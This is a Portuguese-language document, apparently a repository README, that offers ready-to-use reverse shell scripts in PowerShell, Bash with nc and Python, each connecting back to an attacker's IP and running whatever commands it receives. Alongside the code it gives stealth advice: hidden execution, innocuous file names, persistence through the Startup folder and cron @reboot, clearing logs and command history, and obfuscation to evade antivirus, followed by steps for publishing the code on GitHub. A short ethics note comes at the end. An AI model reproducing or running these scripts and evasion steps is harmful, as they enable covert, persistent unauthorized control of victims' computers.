# nc-reverse-shells
1. Script PowerShell (Windows)

# Salvar como reverse_shell.ps1
# Script silencioso para conexão reversa

$ip = "192.168.15.25"   # Substitua pelo IP do atacante
$port = 3000            # Substitua pela porta usada pelo atacante

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $buffer = New-Object System.Byte[] 1024

    while (($bytes = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytes)
        $output = (Invoke-Expression $cmd 2>&1 | Out-String)
        $prompt = "PS " + (Get-Location).Path + "> "
        $response = $output + $prompt
        $sendbyte = ([Text.Encoding]::ASCII).GetBytes($response)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    # Silenciosamente falha, sem erros visíveis ao usuário
    Start-Sleep -Seconds 10
}

Como torná-lo mais silencioso:

    Esconda a execução:
        Execute o script com:

        powershell -WindowStyle Hidden -File reverse_shell.ps1

    Persistência (opcional):
        Coloque o script em um local menos visível (ex.: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup).

2. Script Bash (Linux)

#!/bin/bash
# Salvar como reverse_shell.sh
# Script silencioso para conexão reversa

IP="192.168.15.25"   # Substitua pelo IP do atacante
PORT=3000            # Substitua pela porta usada pelo atacante

# Criação de conexão reversa silenciosa
mkfifo /tmp/.hidden_pipe
cat /tmp/.hidden_pipe | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/.hidden_pipe &
rm -f /tmp/.hidden_pipe  # Remove o pipe após a execução

Como torná-lo mais silencioso:

    Esconda o script:
        Coloque o arquivo em um local menos óbvio, como ~/.cache/ ou /tmp/.hidden/.
        Nomeie-o de forma inofensiva (ex.: .system_update.sh).

    Execução silenciosa:
        Execute o script com:

    nohup ./reverse_shell.sh > /dev/null 2>&1 &

Persistência (opcional):

    Adicione o script ao cron ou rc.local:

        (crontab -l 2>/dev/null; echo "@reboot /caminho/para/reverse_shell.sh") | crontab -

Cuidados Adicionais

    Minimize rastros: Limpe logs e histórico de comandos após a execução.
        Linux:

history -c && unset HISTFILE


Windows: Use PowerShell para limpar o histórico do terminal:

    Clear-History

Obfusque os scripts: Use ferramentas de compactação ou codificação para dificultar sua identificação por antivírus ou administradores.
====================================================================================================================================================================================


Conceito de Reverse Shell

O Reverse Shell é uma técnica usada para obter acesso remoto a uma máquina alvo. Em um cenário normal de Shell (conexão tradicional), um cliente se conecta a um servidor. No caso de um Reverse Shell, o processo é invertido: o cliente (a máquina alvo) faz a conexão para o servidor (o atacante ou explorador), permitindo que o atacante execute comandos na máquina alvo.
Fluxo básico de um Reverse Shell:

    Atacante (servidor): Espera por uma conexão em uma porta específica.
    Alvo (cliente): A máquina alvo se conecta ao servidor do atacante, fornecendo uma "linha" de comunicação através de um socket.
    Execução remota de comandos: O servidor envia comandos para a máquina alvo e recebe a saída desses comandos, executando-os remotamente no alvo.

Código Básico em Python para Reverse Shell

Aqui está um exemplo básico de um Reverse Shell em Python. O código é composto por dois lados:

    Servidor (atacante): escuta por uma conexão.
    Cliente (máquina alvo): se conecta ao servidor e executa os comandos.

1. Servidor (atacante)

Este script é executado no computador do atacante. Ele cria um servidor de escuta na porta especificada, aguardando a conexão do cliente.

import socket

# Defina o endereço IP e a porta para ouvir
ip = "0.0.0.0"  # Escutar em todas as interfaces de rede
porta = 4444

# Cria um socket TCP
servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Liga o socket ao endereço e à porta
servidor.bind((ip, porta))

# Escuta por uma conexão
servidor.listen(1)
print(f"Aguardando conexão na {ip}:{porta}...")

# Aceita a conexão do cliente
cliente, endereco = servidor.accept()
print(f"Conexão estabelecida com {endereco}")

# Envia e recebe dados
while True:
    comando = input("Comando> ")
    if comando.lower() == "sair":
        break
    cliente.send(comando.encode())  # Envia o comando para o cliente
    resposta = cliente.recv(1024)  # Recebe a resposta do cliente
    print(resposta.decode())  # Exibe a resposta do cliente

# Fecha a conexão
cliente.close()
servidor.close()

2. Cliente (máquina alvo)

Este script é executado no computador alvo. Ele se conecta ao servidor (atacante) e executa os comandos recebidos.

import socket
import os

# Defina o IP do atacante e a porta para a conexão
ip = "192.168.0.100"  # Substitua pelo IP do atacante
porta = 4444  # Substitua pela porta usada pelo atacante

# Cria o socket TCP e se conecta ao servidor (atacante)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, porta))

while True:
    # Recebe o comando enviado pelo servidor
    comando = s.recv(1024).decode()

    if comando.lower() == "sair":
        break  # Fecha a conexão se o comando for "sair"

    # Executa o comando no sistema e obtém o resultado
    resultado = os.popen(comando).read()

    # Envia o resultado de volta para o servidor
    s.send(resultado.encode())

# Fecha a conexão com o servidor
s.close()

Explicação do Código

    Servidor (atacante):
        socket.socket(socket.AF_INET, socket.SOCK_STREAM): Cria um socket TCP.
        servidor.bind((ip, porta)): Liga o socket à porta e ao endereço IP do servidor.
        servidor.listen(1): Faz o servidor esperar por uma conexão.
        cliente, endereco = servidor.accept(): Aceita a conexão do cliente.
        cliente.send(comando.encode()): Envia comandos para o cliente.
        cliente.recv(1024): Recebe a resposta do cliente (máquina alvo).
    Cliente (máquina alvo):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM): Cria um socket TCP.
        s.connect((ip, porta)): Conecta-se ao servidor (atacante).
        s.recv(1024).decode(): Recebe o comando enviado pelo servidor.
        os.popen(comando).read(): Executa o comando localmente e captura a saída.
        s.send(resultado.encode()): Envia a resposta do comando de volta ao servidor.

Repositório no GitHub

Agora, para criar um repositório para esse projeto no GitHub, siga esses passos:
Passo 1: Criar o Repositório

    Acesse GitHub e crie um repositório novo chamado reverse-shell-python.
    Na tela de criação, defina um nome para o repositório, como reverse-shell-python.
    Marque a opção "Initialize this repository with a README" e clique em Create repository.

Passo 2: Subir o Código

    Em sua máquina local, crie uma pasta com o nome do projeto:

mkdir reverse-shell-python
cd reverse-shell-python

Crie dois arquivos: servidor.py e cliente.py, e cole o código correspondente a cada um.

Inicialize o repositório Git localmente e faça o primeiro commit:

git init
git add .
git commit -m "Adicionando código básico de Reverse Shell"

Conecte o repositório local ao repositório remoto do GitHub:

git remote add origin https://github.com/SEU_USUARIO/reverse-shell-python.git

Suba o código para o GitHub:

    git push -u origin master

Agora, seu repositório com o código do Reverse Shell estará disponível no GitHub!
Nota de Ética e Segurança

Embora o Reverse Shell seja uma técnica útil para profissionais de segurança, seu uso em sistemas sem autorização é ilegal e antiético. Use essas habilidades para fins educacionais, como análise de segurança e testes de penetração, sempre com permissão explícita do proprietário do sistema.
